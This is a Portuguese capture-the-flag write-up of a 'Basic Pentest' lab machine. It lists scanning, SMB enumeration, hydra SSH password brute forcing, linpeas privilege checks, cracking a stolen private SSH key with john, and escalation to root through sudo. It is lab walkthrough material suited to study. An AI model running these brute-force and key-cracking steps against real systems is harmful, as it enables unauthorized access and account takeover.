# Basic Pentest

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.179.32
```
![image](https://github.com/lufffe/Writeups/assets/90646635/6f3c236f-adcc-4efa-bdfe-1ba09e09d9c9)

![image](https://github.com/lufffe/Writeups/assets/90646635/8eaf713c-d847-41b8-a492-cb97e4af6779)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80,139,445,8009,8080 10.10.179.32
```
![image](https://github.com/lufffe/Writeups/assets/90646635/fe539f41-7a1c-4b51-82ef-0278c9ab0401)

* ###  Scan de Arquivos e Diretórios.
```bash
gobuster dir -u http://10.10.179.32 -w ~/directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/572df05a-e1fb-4f4f-b0ea-b3a9a3f3a77b)

* ### Olhando no http
![image](https://github.com/lufffe/Writeups/assets/90646635/7c680101-b962-4f3a-bfdd-0b9060de89c4)


* ### Como tem o samba rodando dar uma olhada no que tem lá.
```bash
smbclient -L //10.10.179.32/
```
![image](https://github.com/lufffe/Writeups/assets/90646635/cef336ef-c0db-4943-a4de-3c7682f400bf)

* ### Encontrando e baixando arquivo encontrado no samba.
```bash
smbclient //10.10.179.32/anonymous
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c5933818-ff7f-44a5-8101-4a63a087e6f3)

```bash
cat staff.txt 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/aff33771-6353-4c18-ad69-f418bdef2c7a)

* ### Brute Force com o hydra para descobrir a senha do usuário no serviço do SSH.
```bash
hydra -l jan -P ~/rockyou.txt 10.10.179.32 ssh -t 64
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ef38f23b-63ad-4cd8-9638-aa88fb7f1c04)


* ### Subindo um servidor em python para transferir o linpeas para a maquina e listar possibilidades de escalar previlégios.
![image](https://github.com/lufffe/Writeups/assets/90646635/d6f76d30-1f95-4a32-95fa-5137df98661c)

![image](https://github.com/lufffe/Writeups/assets/90646635/38a42775-f447-4ffe-91a8-fe6bcc0016e6)

* ### Encontrado uma chave ssh do outro usuário.
![image](https://github.com/lufffe/Writeups/assets/90646635/0fa96df8-d4cd-4d33-9863-1d95f0737323)

* ### Encontrando a senha da chave que estava privada.
```bash
ssh2john id_rsa > hash
```
```bash
john --wordlist=~/rockyou.txt hash
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e5aa2cc0-2b85-4b96-beab-78a11a46a35b)

jan@basic2:~$ ssh -i /home/kay/.ssh/id_rsa kay@10.10.179.32

* ### E com o acesso ao novo usuário se encontra a ultima senha necessária do desafio, e a execusão do sudo é livre então pegar o root é simples.
![image](https://github.com/lufffe/Writeups/assets/90646635/16d00e9b-9584-4360-adf1-27a1927f1e5f)
